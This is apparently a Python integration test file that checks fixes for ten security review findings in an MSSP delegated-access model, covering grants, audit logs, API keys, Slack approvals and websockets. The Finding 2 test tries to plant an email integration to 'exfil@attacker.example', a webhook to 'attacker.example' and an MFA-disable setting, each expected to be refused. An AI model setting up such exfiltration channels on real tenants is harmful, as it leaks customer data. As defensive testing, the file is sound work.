"""ARCH-E4.1e: the independent security review of the MSSP organisation model, each finding asserted fixed.

The principle: nothing created or changed under a grant may outlive the
grant, act as a customer user, or erase the customer's record. Each test
started as the reviewer's proof of the vulnerable behaviour and now asserts
the safe one.
"""

from __future__ import annotations

import asyncio
import json
import time
from datetime import UTC, datetime, timedelta
from typing import Any, Dict, List
from urllib.parse import urlencode
from uuid import uuid4

import httpx
import pytest
from websockets.asyncio.client import connect
from websockets.exceptions import ConnectionClosed

from lg_sotf.integrations.http import IntegrationHttp
from lg_sotf.integrations.slack import slack_signature
from lg_sotf.queue.events import make_event
from lg_sotf.services.response import PlanContext, ResponseService
from tests.integration.api._bodies import request_body
from tests.integration.api._support import TENANT_A, TENANT_B, ApiHarness, recv_json, serve_api
from tests.integration.integrations._support import Receiver, public_resolver, slack_url
from tests.integration.services._support import add_alert

pytestmark = pytest.mark.integration

API = "/api/v1"
ORG = "mssp-org"
OTHER = "other-mssp"


async def _org(api: ApiHarness, org: str = ORG) -> None:
    await api.repos.tenants.create(org, org)
    await api.repos.organisations.upsert(org, org)


async def _member(api: ApiHarness, role: str = "admin", org: str = ORG) -> Any:
    staff = await api.user(org, role)
    await api.repos.organisations.add_member(org, staff.id)
    return staff


async def _grant(api: ApiHarness, role: str = "admin", tenant_id: str = TENANT_B, **kw: Any) -> Any:
    return await api.repos.grants.create(
        tenant_id, kw.pop("org", ORG), role, reason="cover", created_by="customer-admin",
        expires_at=datetime.now(UTC) + timedelta(hours=8), **kw,
    )


def _body(**kw: Any) -> Dict[str, Any]:
    base = {
        "organisation_id": ORG, "role": "analyst", "reason": "MSA-42",
        "expires_at": (datetime.now(UTC) + timedelta(days=7)).isoformat(),
    }
    base.update(kw)
    return base


async def _actions(api: ApiHarness, tenant_id: str) -> List[str]:
    return [e.action for e in (await api.repos.audit.list(tenant_id, limit=200)).items]


# Finding 3 --------------------------------------------------------------------------------------
async def test_the_organisation_cannot_erase_the_customers_grant_records(api: ApiHarness) -> None:
    await _org(api)
    org_admin = await _member(api, "admin")
    staff = await _member(api, "analyst")
    staff2 = await _member(api, "analyst")
    customer = await api.login_headers(TENANT_B, "admin")
    live = await api.client.post(f"{API}/tenant/grants", json=_body(user_id=str(staff.id)), headers=customer)
    old = await api.client.post(f"{API}/tenant/grants", json=_body(user_id=str(staff.id), role="viewer"), headers=customer)
    assert live.status_code == old.status_code == 201, (live.text, old.text)
    revoked = await api.client.post(f"{API}/tenant/grants/{old.json()['id']}/revoke", headers=customer)
    assert revoked.status_code == 200
    other = await api.client.post(f"{API}/tenant/grants", json=_body(user_id=str(staff2.id)), headers=customer)
    assert other.status_code == 201
    chain_before = await _actions(api, TENANT_B)

    removed = await api.client.delete(f"{API}/organisation/members/{staff.id}", headers=api.auth(org_admin))
    assert removed.status_code == 204
    deleted = await api.client.delete(f"{API}/users/{staff2.id}", headers=api.auth(org_admin))
    assert deleted.status_code == 204, deleted.text

    assert len(await api.repos.grants.list_for_tenant(TENANT_B)) == 3  # the customer's record stays whole
    assert await _actions(api, TENANT_B) == chain_before
    assert len((await api.client.get(f"{API}/tenant/grants", headers=customer)).json()) == 3
    assert (await api.repos.audit.verify_chain(TENANT_B)).ok
    # ...and the removed member's grant no longer works.
    as_staff = {**api.auth(staff), "X-Tenant-ID": TENANT_B}
    assert (await api.client.get(f"{API}/alerts", headers=as_staff)).status_code == 403


# Finding 2 --------------------------------------------------------------------------------------
async def test_an_admin_grant_cannot_plant_channels_or_change_settings(api: ApiHarness) -> None:
    await _org(api)
    staff = await _member(api, "admin")
    grant = await _grant(api, "admin")
    h = {**api.auth(staff), "X-Tenant-ID": TENANT_B}
    mail = await api.client.post(
        f"{API}/integrations",
        json={"kind": "email", "name": "cc", "events": ["escalation.created"],
              "config": {"recipients": ["exfil@attacker.example"]}},
        headers=h,
    )
    hook = await api.client.post(
        f"{API}/integrations",
        json={"kind": "webhook", "name": "soar", "events": ["escalation.created"],
              "config": {"url": "https://attacker.example/hook"}, "secret": {"signing_secret": "s" * 24}},
        headers=h,
    )
    mfa = await api.client.patch(f"{API}/tenant/settings", json={"security": {"require_mfa": False}}, headers=h)
    source = await api.client.post(f"{API}/sources", json={"type": "webhook", "name": "planted"}, headers=h)
    assert (mail.status_code, hook.status_code, mfa.status_code, source.status_code) == (403, 403, 403, 403)
    await api.repos.grants.revoke(TENANT_B, grant.id, revoked_by="customer-admin")
    assert await api.repos.integrations.list(TENANT_B) == []
    # Suppressions stay available to analysts, but expire with the grant and name it.
    analyst = await _member(api, "analyst")
    second = await _grant(api, "analyst", user_id=analyst.id)
    rule = await api.client.post(
        f"{API}/suppressions", json={"name": "scanner", "match": {"fingerprint": "fp-b"}},
        headers={**api.auth(analyst), "X-Tenant-ID": TENANT_B},
    )
    assert rule.status_code == 201, rule.text
    stored = await api.repos.suppressions.get(TENANT_B, rule.json()["id"])
    assert stored.grant_id == second.id and stored.expires_at == second.expires_at


# Finding 4 --------------------------------------------------------------------------------------
async def test_org_api_keys_need_a_member_creator_and_the_customers_consent(api: ApiHarness) -> None:
    await _org(api)
    outsider = await api.user(ORG, "admin")  # an admin of the home tenant who is NOT a member
    creator = await _member(api, "admin")
    grant = await _grant(api, "admin")  # to the whole organisation, keys not allowed
    keys = {}
    for name, user in (("outsider", outsider), ("member", creator)):
        made = await api.client.post(
            f"{API}/api-keys", json={"name": name, "scopes": ["read", "write"]}, headers=api.auth(user)
        )
        assert made.status_code == 201, made.text
        keys[name] = {"X-API-Key": made.json()["key"], "X-Tenant-ID": TENANT_B}
    assert (await api.client.get(f"{API}/alerts", headers=keys["member"])).status_code == 403  # no consent yet
    await api.repos.grants.revoke(TENANT_B, grant.id, revoked_by="customer-admin")
    await _grant(api, "admin", allow_api_keys=True)
    assert (await api.client.get(f"{API}/alerts", headers=keys["member"])).status_code == 200
    assert (await api.client.get(f"{API}/alerts", headers=keys["outsider"])).status_code == 403
    # The creating account is deleted from the organisation: its key stops working at once.
    assert await api.repos.users.delete(ORG, creator.id)
    assert (await api.client.get(f"{API}/alerts", headers=keys["member"])).status_code == 403


# Finding 6 --------------------------------------------------------------------------------------
async def test_the_audit_log_hides_the_grant_register_under_a_grant(api: ApiHarness) -> None:
    await _org(api)
    await _org(api, OTHER)
    staff = await _member(api, "admin")
    customer = await api.login_headers(TENANT_B, "admin")
    secret_reason = "Incident IR-2026-117: ransomware, retained Other MSSP under NDA"
    made = await api.client.post(
        f"{API}/tenant/grants", json=_body(organisation_id=OTHER, role="admin", reason=secret_reason), headers=customer
    )
    assert made.status_code == 201
    await _grant(api, "admin")
    h = {**api.auth(staff), "X-Tenant-ID": TENANT_B}
    assert (await api.client.get(f"{API}/tenant/grants", headers=h)).status_code == 403
    for params in ({"action": "grant.created"}, {}):
        audit = await api.client.get(f"{API}/audit", params=params, headers=h)
        assert audit.status_code == 200
        assert secret_reason not in audit.text and OTHER not in audit.text
        assert not any(e["action"].startswith("grant.") for e in audit.json()["items"])
    # The customer's own admins still see everything.
    assert secret_reason in (await api.client.get(f"{API}/audit", headers=customer)).text


# Finding 7 --------------------------------------------------------------------------------------
async def test_reads_under_a_grant_are_recorded_by_the_organisation_too(api: ApiHarness) -> None:
    await _org(api)
    staff = await _member(api, "admin")
    await _grant(api, "admin")
    h = {**api.auth(staff), "X-Tenant-ID": TENANT_B}
    for path in ("/alerts", "/users", "/audit", "/tenant/settings", "/integrations", "/sources"):
        assert (await api.client.get(f"{API}{path}", headers=h)).status_code == 200, path
    assert (await _actions(api, TENANT_B)).count("grant.tenant_access") == 6
    assert (await _actions(api, ORG)).count("delegated.grant.tenant_access") == 6


# Finding 5 --------------------------------------------------------------------------------------
async def test_a_delegated_socket_closes_when_the_organisation_is_suspended(make_api: Any) -> None:
    api = await make_api(api={"ws_revalidate_s": 0.2})
    await _org(api)
    staff = await _member(api, "analyst")
    await _grant(api, "viewer")
    token = api.token(staff)
    async with serve_api(api) as served:
        async with connect(f"{served}/ws?token={token}&tenant={TENANT_B}") as ws:
            assert (await recv_json(ws))["tenant_id"] == TENANT_B
            await api.repos.tenants.set_status(ORG, "suspended")
            api.ctx.tenants.invalidate(ORG)
            await asyncio.sleep(1.5)  # > 7 revalidation intervals
            await api.ctx.events.publish(TENANT_B, make_event("alert.created", TENANT_B, "after-suspension", {}))
            with pytest.raises(ConnectionClosed) as closed:
                while True:
                    await recv_json(ws, wait_s=3.0)
            assert closed.value.rcvd is not None and closed.value.rcvd.code == 1008


# Finding 10 -------------------------------------------------------------------------------------
# Operations whose minimal body is well-formed but semantically refused (422) even when authorised.
SEMANTIC_422 = {
    "POST /api/v1/suppressions",  # a rule needs at least one predicate (an empty match would close every alert)
    "POST /api/v1/integrations/slack/interactions",  # a signed form post from Slack, not JSON
}


async def test_minimal_bodies_reach_the_handlers_of_authorised_routes(api: ApiHarness) -> None:
    """With bodies built from the contract, an authorised write reaches its handler instead of a 422."""
    await _org(api)
    staff = await _member(api, "admin")
    await _grant(api, "admin")
    h = {**api.auth(staff), "X-Tenant-ID": TENANT_B}
    ids = {
        "alert_id": "a1", "escalation_id": "e1", "action_id": "00000000-0000-0000-0000-000000000001",
        "source_id": "s1", "rule_id": "r1", "integration_id": "00000000-0000-0000-0000-000000000001",
        "user_id": "00000000-0000-0000-0000-000000000001", "key_id": "00000000-0000-0000-0000-000000000001",
        "grant_id": "00000000-0000-0000-0000-000000000001", "tenant_id": TENANT_A,
    }
    spec = api.app.openapi()
    masked: List[str] = []
    for path, operations in spec["paths"].items():
        if not path.startswith(API) or path.endswith("/auth/logout"):
            continue
        for method in operations:
            body = request_body(spec, path, method)
            response = await api.client.request(method.upper(), path.format(**ids), json=body, headers=h)
            if response.status_code == 422 and f"{method.upper()} {path}" not in SEMANTIC_422:
                masked.append(f"{method.upper()} {path}: {response.text[:160]}")
    assert masked == []


# Finding 1 --------------------------------------------------------------------------------------
def _click(action_id: str, slack_user: str) -> bytes:
    payload = {
        "type": "block_actions", "trigger_id": uuid4().hex, "user": {"id": slack_user, "username": "someone"},
        "team": {"id": "T0"}, "response_url": "https://hooks.slack.com/actions/T0/1/" + "r" * 16,
        "actions": [{"action_id": "lgsotf_approve", "value": action_id}],
    }
    return urlencode({"payload": json.dumps(payload)}).encode()


async def _signed_post(api: ApiHarness, path: str, body: bytes, secret: str) -> httpx.Response:
    ts = str(int(time.time()))
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", "X-Slack-Request-Timestamp": ts,
        "X-Slack-Signature": slack_signature(secret, ts, body),
    }
    return await api.client.post(path, content=body, headers=headers)


async def _awaiting_action(api: ApiHarness) -> str:
    alert_id = await add_alert(api.repos, TENANT_B, entities={"hosts": ["ws-042"]})
    plan = await ResponseService(api.repos, api.ctx.settings).plan(
        TENANT_B, alert_id,
        PlanContext(severity="high", title="t", evidence="analyst", recommended_actions=["isolate_host"],
                    hosts=["ws-042"], entities={"host": ["ws-042"]}),
    )
    [action_id] = [str(a.id) for a in (await api.repos.actions.list(TENANT_B, alert_id=alert_id)).items
                   if str(a.id) in {str(x) for x in plan.awaiting} and a.action_type == "isolate_host"]
    return action_id


async def test_no_slack_app_planted_under_a_grant_ever_approves(api: ApiHarness) -> None:
    await _org(api)
    staff = await _member(api, "admin")
    await _grant(api, "admin")
    await api.user(TENANT_B, "admin", email="boss@tenant-b.example.com")
    signing, bot = "mssp-owned-signing-" + "x" * 20, "xoxb-mssp-owned-" + "x" * 20
    body = {"kind": "slack", "name": "SOC alerts", "events": ["action.awaiting_approval"],
            "config": {"interactive_approvals": True},
            "secret": {"webhook_url": slack_url(), "signing_secret": signing, "bot_token": bot}}
    planted = await api.client.post(
        f"{API}/integrations", json=body, headers={**api.auth(staff), "X-Tenant-ID": TENANT_B}
    )
    assert planted.status_code == 403

    # Defence in depth for a row written under a grant: a signed click through it never decides.
    customer = await api.login_headers(TENANT_B, "admin")
    made = await api.client.post(f"{API}/integrations", json=body, headers=customer)
    assert made.status_code == 201, made.text
    integration_id = made.json()["id"]

    def users_info(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={"ok": True, "user": {"id": "UBOSS", "is_email_confirmed": True,
                                                                "profile": {"email": "boss@tenant-b.example.com"}}})

    api.app.state.integrations_http = IntegrationHttp(
        api.ctx.settings, transport=httpx.MockTransport(Receiver({"GET /api/users.info": users_info})),
        resolver=public_resolver,
    )
    path = f"{API}/integrations/slack/interactions?tenant={TENANT_B}&integration={integration_id}"
    control = await _awaiting_action(api)
    assert (await _signed_post(api, path, _click(control, "UBOSS"), signing)).status_code == 200
    assert (await api.repos.actions.get(TENANT_B, control)).status == "approved"  # the customer's own app works

    grant = (await api.repos.grants.list_for_tenant(TENANT_B))[0]
    async with api.ctx.db.system_tx() as conn:
        await conn.execute("UPDATE integrations SET grant_id = $1 WHERE id = $2", grant.id, integration_id)
    action_id = await _awaiting_action(api)
    await _signed_post(api, path, _click(action_id, "UBOSS"), signing)
    assert (await api.repos.actions.get(TENANT_B, action_id)).status == "awaiting_approval"


# Finding 8 --------------------------------------------------------------------------------------
async def test_organisation_lists_need_membership_and_grant_creation_is_rate_limited(api: ApiHarness) -> None:
    await _org(api)
    member = await _member(api, "viewer")
    stranger = await api.user(ORG, "viewer")  # a home-tenant account that is not a member
    org_admin = await api.user(ORG, "admin")  # manages membership without being a member
    for path in ("/organisation/grants", "/organisation/members"):
        assert (await api.client.get(f"{API}{path}", headers=api.auth(stranger))).status_code == 403, path
        assert (await api.client.get(f"{API}{path}", headers=api.auth(member))).status_code == 200, path
        assert (await api.client.get(f"{API}{path}", headers=api.auth(org_admin))).status_code == 200, path
    customer = await api.login_headers(TENANT_B, "admin")
    statuses = []
    for i in range(12):
        made = await api.client.post(f"{API}/tenant/grants", json=_body(organisation_id=f"org-{i}"), headers=customer)
        statuses.append(made.status_code)
    assert statuses[:10] == [201] * 10 and statuses[-1] == 429


# Finding 9 --------------------------------------------------------------------------------------
async def test_saving_an_organisation_is_audited_in_the_platform_admins_chain(api: ApiHarness) -> None:
    await api.repos.tenants.create(ORG, ORG)
    platform = await api.login_headers(TENANT_A, "admin", platform_admin=True)
    saved = await api.client.put(f"{API}/platform/organisations/{ORG}", json={"name": "Acme"}, headers=platform)
    assert saved.status_code == 200, saved.text
    assert "organisation.saved" in await _actions(api, ORG)
    assert "platform.organisation_saved" in await _actions(api, TENANT_A)
